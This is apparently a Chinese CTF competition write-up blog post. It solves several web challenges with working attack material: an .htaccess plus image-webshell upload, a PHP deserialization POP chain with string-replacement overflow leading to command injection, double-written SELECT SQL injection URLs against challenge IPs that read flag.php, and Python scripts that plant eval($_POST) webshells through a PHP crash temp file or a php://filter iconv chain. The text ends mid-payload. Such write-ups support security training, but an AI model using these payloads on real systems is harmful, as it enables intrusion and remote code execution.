    <content type="html"><![CDATA[<p>Rank: 10，（东部赛区太卷了吧）</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="upload-lol"><a href="#upload-lol" class="headerlink" title="upload_lol"></a>upload_lol</h2><p>先传.htaccess，再传图片马，getshell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-1.png"></p><p>有个内容检测，php版本为5，用script标签绕过即可<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-2.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/upload_lol-3.png"></p><h2 id="ezpop-new"><a href="#ezpop-new" class="headerlink" title="ezpop_new"></a>ezpop_new</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;fopen&#x27;</span>,<span class="hljs-string">&#x27;fread&#x27;</span>,<span class="hljs-string">&#x27;file_get_contents&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;nonono&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bob</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>=True;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;flag)&#123;<br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br>            <span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br>            <span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br>            <span class="hljs-comment">#var_dump(filter(serialize($cindy)));</span><br>            <span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br>            <span class="hljs-variable">$cindy</span>-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$someone</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Alice</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c-&gt;b;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>从入口先到<code>__destruct()</code>，往下走只能是echo触发<code>__toString</code>或者<code>$this-&gt;c-&gt;b</code>，对于<code>$this-&gt;c</code>触发<code>__get</code>，这里显然只有<code>__get</code>能用</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ezpop_new-1.png"></p><p>但是进入<code>__get</code>中利用的部分需要条件<code>if($this-&gt;flag)</code>，显然</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;flag = False;<br>    &#125;<br></code></pre></td></tr></table></figure><p>会阻碍这个条件成立</p><p>由于题目中的PHP版本合适,可以采用修改超过成员数目来绕过<code>wakeup</code></p><p>payload:<code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;</code></p><p>进入下一个利用部分，考察反序列化字符串替换溢出</p><p>利用点在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PingUtils</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c4 $&#123;args[0]&#125;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而此又需要从</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cindy</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$someone</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$phone</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">call</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;phone-&gt;<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-variable">$this</span>-&gt;someone);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>触发</p><p>但是此处的赋值是无法实现这个功能的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cindy</span>();<br><span class="hljs-variable">$cindy</span>-&gt;someone =  <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;someone&#x27;</span>];<br><span class="hljs-variable">$cindy</span>-&gt;phone = <span class="hljs-string">&quot;p50&quot;</span>;<br></code></pre></td></tr></table></figure><p>利用点在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cindy</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cindy</span>)));<br></code></pre></td></tr></table></figure><p>其中的filter会对反序列化后的字符串进行特定值替换,然后再解压</p><div class="note note-info">            <p>所以可以通过赋值特定字符串触发filter中的过滤实现溢出,从而达到后面自PingUtils类到filter这条链的利用</p><p>因为序列化后的字符串中是依靠特定位置的数字来标示其后的属性内容的长度,这个非等长替换就会导致在反序列化解析时出现整体的偏移,原本的作为结构的部分被偏移到属性内容的部分,属性内容的部分值又会偏移视为结构的部分</p><p>构造足够多的非等长替换,就能偏移出一个完整结构部分,在里面定义出需要的属性</p><p>一个序列化后的字符串如果存在多余无法正常解析的部分,这部分前面如果能被正常解析,那么多余部分在解析时会被抛弃掉，所以构造产生多余数据不用担心，会被忽略掉</p>          </div><p>构造出payload:<br><code>someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|ls  /&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p><div class="note note-info">            <p>对于payload来说，在<code>filter</code>替换前<code>$cindy-&gt;someone</code>属性的值序列化字符串表示是 <code>s:5:&quot;cindy&quot;;s:224:&quot;PAYLOADSTRING....&quot;</code>这样</p><p>但是<code>filter</code>替换会把<code>fread</code>换成<code>nonono</code>即长度<code>5</code>的字符串变成长度<code>6</code></p><p>但此时<code>$cindy-&gt;someone</code>属性用来表示其值 这一字符串的长度的数字还是<code>224</code>没变</p><p>但实际上替换后值字符串的总长度由<code>224</code>变成了<code>224+35</code>(有35个fread替换为了nonono)</p><p>所以反序列化只会取值字符串前<code>224</code>个字符作为<code>$cindy-&gt;someone</code>属性反序列化后的值</p><p>剩下<code>35</code>则会被当成反序列化字符串中的结构部分杯解析</p><p>即在PHP看来整个字符串是这样的<code>&quot;cindy&quot;;s:224:&quot;AfterPayloadString...&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:{}}</code></p><p>在<code>cindy</code>属性后面还有一个属性<code>phone</code>,其值是个名为<code>PingUtils</code>的对象</p><p>注意最末尾的<code>}</code>.这个将于整个反序列化字符串开始的<code>{</code>闭合,PHP将把这个看作反序列化字符串的结尾</p><p>只有后面的内容由于结构不完整PHP并不会解析,而是直接抛弃并且不会产生任何报错</p>          </div><p>读取flag：<br><code>?pop=O:5:&quot;Alice&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;Bob&quot;:2:&#123;s:4:&quot;flag&quot;;b:1;&#125;&#125;&amp;someone=freadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfreadfread|nl /*&quot;;s:5:&quot;phone&quot;;O:9:&quot;PingUtils&quot;:0:&#123;&#125;&#125;</code></p><h2 id="file-sql-new"><a href="#file-sql-new" class="headerlink" title="file_sql_new"></a>file_sql_new</h2><p><em>赛后复现</em></p><p>sql注入，过滤了一次select</p><p>双写select绕过</p><p>payload：</p><p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),3%23</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-1.png"></p><p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(selselectect(group_concat(column_name))from(information_schema.columns)where((table_name)=(%27fl4g%27))),3%23</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-2.png"></p><p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seselectlect(fllllag)from(fl4g)),3%23</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-3.png"></p><p><code>http://39.107.71.45:65441/index.php?id=-1%27union%20seleselectct%201,(seleselectct(hex(load_file(%22/var/www/html/flag.php%22)))),3%23</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/file_sql_new-4.png"></p><p>得到<code>3C3F7068700A0A24666C6167203D207B6C69726768793864757370717A6A6631623735636E6561773330343974766D787D3B0A6563686F20226161223B0A3F3E0A</code>，转字符串即可得到flag</p><h2 id="ezweb-new"><a href="#ezweb-new" class="headerlink" title="ezweb_new"></a>ezweb_new</h2><p><em>赛后复现</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$_</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;‮imaohw?⁦⁩⁦whoami&#x27;</span>];<span class="hljs-comment">//</span><br>    <span class="hljs-variable">$__</span>=<span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_</span> &amp;&amp; @<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_</span>)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&#x27;@&lt;?php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$__</span>));<br></code></pre></td></tr></table></figure><p>上来有个小陷阱，在传参的地方，用鼠标选，会发现注释处左右的字符串不受你控制，这里考的就是<code>unicode</code>字符串了</p><p>当复制代码进某些编辑器中可以看到识别到了一些<code>Unicode</code>字符串,参数很明显不是<code>whoami</code>了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-1.png"></p><p>将<code>[U+202E]</code>等进行Url编码，得到<code>%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami</code></p><p>继续往下看，可以有两种方法做</p><p>方法一：<br>PHP崩溃getshell</p><p>使php崩溃后保留下临时文件，然后利用<code>scandir</code>查文件名，最后包含达到getshell</p><p>写马：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://82.157.177.192:46728/?%E2%80%AEimaohw%3F%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span><br>paramsMultipart = [(<span class="hljs-string">&#x27;file&#x27;</span>, (<span class="hljs-string">&#x27;a.php&#x27;</span>, <span class="hljs-string">&quot;@&lt;?php\r\neval(\x24_POST[&#x27;a&#x27;]);\r\necho 123;\r\n?&gt;&quot;</span>, <span class="hljs-string">&#x27;application/octet-stream&#x27;</span>))]<br><br>requests.post(url,files=paramsMultipart)<br></code></pre></td></tr></table></figure><p>查文件名：<br><code>http://82.157.177.192:46728/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=1&amp;__=/tmp/</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-2.png"></p><p>getshell：<br><code>http://82.157.177.192:46728/??%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=/tmp/phpsxtpjV</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/qgb-ezweb_new-3.png"></p><p>方法二：<br>filter构造一句话rce</p><p><a href="https://blog.csdn.net/rfrder/article/details/122326155">原理参考1</a><br><a href="https://tttang.com/archive/1395/">原理参考2</a></p><p><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">项目地址</a></p><p>师傅们如果生成出来的payload不能用的话可以试试切换系统，比如用ubuntu或者kali或者debian试试（不要用windows，因为在windows下文件名不区分大小写），还有php版本尽量跟题目保持一致，否则服务器上的iconv默认支持和靶机不一样，就会无效。要是还不行就试试项目中的fuzzer.php，重新构造下(我构造这个花了一天的时间，呜呜呜)</p><p>我的poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br><span class="hljs-comment">#@&lt;?php eval($_POST[2]);;?&gt;</span><br>base64_payload = <span class="hljs-string">&quot;QDw/cGhwIGV2YWwoJF9QT1NUWzJdKTs7Pz4K&quot;</span><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">if</span>(c==<span class="hljs-string">&quot;/&quot;</span>):<br>            c=<span class="hljs-string">&quot;%2f&quot;</span><br>        filters += <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./res/&#x27;</span>+c).read() + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&lt;?php echo file_get_contents(&quot;&#x27;</span>+final_payload+<span class="hljs-string">&#x27;&quot;);?&gt;&#x27;</span>)<br><span class="hljs-built_in">print</span>(final_payload)<br></code></pre></td></tr></table></figure><div class="note note-info">            <p><a href="http://47.94.151.201:31863/?%E2%80%AEimaohw?%E2%81%A6%E2%81%A9%E2%81%A6whoami=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP866.CSUNICODE%7Cconvert.iconv.CSISOLATIN5.ISO_6937-2%7Cconvert.iconv.CP950.UTF-16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.iconv.ISO-IR-103.850%7Cconvert.iconv.PT154.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.GBK.BIG5%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP869.UTF-32%7Cconvert.iconv.MACUK.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.ISO88597.UTF16%7Cconvert.iconv.RK1048.UCS-4LE%7Cconvert.iconv.UTF32.CP1167%7Cconvert.iconv.CP9066.CSUCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500-1983.UCS-2BE%7Cconvert.iconv.MIK.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP950.SHIFT_JISX0213%7Cconvert.iconv.UHC.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UNICODE%7Cconvert.iconv.ISIRI3342.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.JS.UNICODE%7Cconvert.iconv.L4.UCS2%7Cconvert.iconv.UCS-4LE.OSF05010001%7Cconvert.iconv.IBM912.UTF-16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.iconv.UHC.CP1361%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.CP949.UTF32BE%7Cconvert.iconv.ISO_69372.CSIBM921%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP861.UTF-16%7Cconvert.iconv.L4.GB13000%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSGB2312.UTF-32%7Cconvert.iconv.IBM-1161.IBM932%7Cconvert.iconv.GB13000.UTF16BE%7Cconvert.iconv.864.UTF-32LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L4.UTF32%7Cconvert.iconv.CP1250.UCS-2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.